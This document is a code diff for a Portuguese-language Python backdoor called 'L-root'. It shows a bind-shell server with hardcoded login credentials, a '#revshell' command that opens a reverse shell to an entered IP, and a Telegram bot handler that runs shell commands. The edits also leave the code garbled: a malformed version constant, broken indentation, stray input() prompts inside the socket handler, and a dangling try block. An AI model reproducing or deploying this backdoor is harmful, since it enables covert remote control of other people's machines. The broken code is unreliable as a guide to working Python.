@@ -8,13 +8,16 @@ import multiprocessing as mp
 import sys
 import os
 
-MIN_PYTHON = (3.11.2, 3.9.9, 3.6.9 )  # Versão mínima do Python exigida
+MIN_PYTHON = ("3.6.9")  # Versão mínima do Python exigida
 
-if sys.version_info < MIN_PYTHON:
-    print(f"A maquina não tem a versão python requerida para usar o L-root por isso a instalação será interrompida. voçê pode instalar a versão python compatível manualmente... :) {MIN_PYTHON[0]}.{MIN_PYTHON[1]} ou superior. Você está executando o Python {sys.version}")
+MIN_PYTHON_VERSION = tuple(map(int, MIN_PYTHON.split(".")))
+
+if sys.version_info < MIN_PYTHON_VERSION:
+    print(f"A instalação do L-root será interrompida porque a versão mínima do Python exigida é {MIN_PYTHON[0]}. ou superior. Você está executando o Python {sys.version}. Você pode instalar a versão Python compatível manualmente.")
     sys.exit(1)
 else:
-    print("Versâo do Python conpatível detectada. Continuando instalação...")
+    print("Versão compatível do Python detectada. Continuando a instalação...")
+
 
 black='\033[0;90m'
 red='\033[0;91m'
@@ -92,10 +95,8 @@ def get_king(update, context):
     subprocess.run(comando3, shell=True)
     
     update.message.reply_text("Sua coroação foi feita com sucesso :)")
-    
- except subprocess.CalledProcessError as e:
-        update.message.reply_text(f"Parece que aconteceu um erro :(: {e}")
-        
+   
+   
     #executar o #getking quando recebido
     if update.message.text == '#getking':
         get_king(update, context)
@@ -153,15 +154,28 @@ def handle_client(client_sock):
     client_sock.send(f'[{green}Login{off}]: '.encode())
     username = client_sock.recv(1024).decode().strip()
     client_sock.send(f'[{green}Password{off}]: '.encode()) 
-   password = client_sock.recv(1024).decode().strip()
+    password = client_sock.recv(1024).decode().strip()
    
-    #Change username and Password
-    if username == 'Machine' and password == 'sorvete':
-        client_sock.send(b'\033c')
-        client_sock.send(f'{banner_reaper}\n'.encode())
-        client_sock.send(f'{green}[*]{off} Welcome\n{green}[+]{off} python version: {python_version}\n{green}[+]{off} backdoor version: {backdoor_version}\n{green}[+]{off} Use #help to see the commands\n{red}[+]{yellow} This is A bind Shell to Have a Reverse Shell Use the command {green}#revshell\n{off}'.encode())
-        client_sock.send(f'\n[{red}{vusername}{off}@{red}{hostname}{off}]:~# '.encode())
-        while True:
+  # O usuario e senha
+username = input("Digite seu nome de usuário: ")
+
+if username == 'Machine':
+    password = input("Digite sua senha: ")
+    if password == 'sorvete':
+        print("Bem-vindo, Machine!")
+        # código para executar se o usuário e a senha estiverem corretos
+    else:
+        print("Senha incorreta!")
+        # código para executar se a senha estiver incorreta
+else:
+    print("Usuário incorreto!")
+    # código para executar se o usuário estiver incorreto
+
+    client_sock.send(b'\033c')
+    client_sock.send(f'{banner_reaper}\n'.encode())
+    client_sock(f'{green}[*]{off} Bem-Vindo\n{green}[+]{off} python versão: {python_version}\n{green}[+]{off} backdoor versão: {backdoor_version}\n{green}[+]{off} Use #help para ver os comandos\n{red}[+]{yellow} Este é um shell de ligação para ter um shell reverso Use o comando {green}#revshell\n{off}'.encode())
+    client_sock.send(f'\n[{red}{vusername}{off}@{red}{hostname}{off}]:~# '.encode())
+    while True:
             cmd = client_sock.recv(1024).decode().strip()
             if cmd == '#revshell':
                 client_sock.send(f"[{green}ip{off}]: ".encode())
@@ -188,8 +202,8 @@ def handle_client(client_sock):
             client_sock.send(f'\n[{red}{vusername}{off}@{red}{hostname}{off}]:~# '.encode())
 
     else:
-        client_sock.send(f'\n[{red}\o/ Wrong Passowrd{off}]\n'.encode())
-    client_sock.close()
+         client_sock.send(f'\n[{red}\o/ Wrong Passowrd{off}]\n'.encode())
+         client_sock.close()
 
 def start_server():
     server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
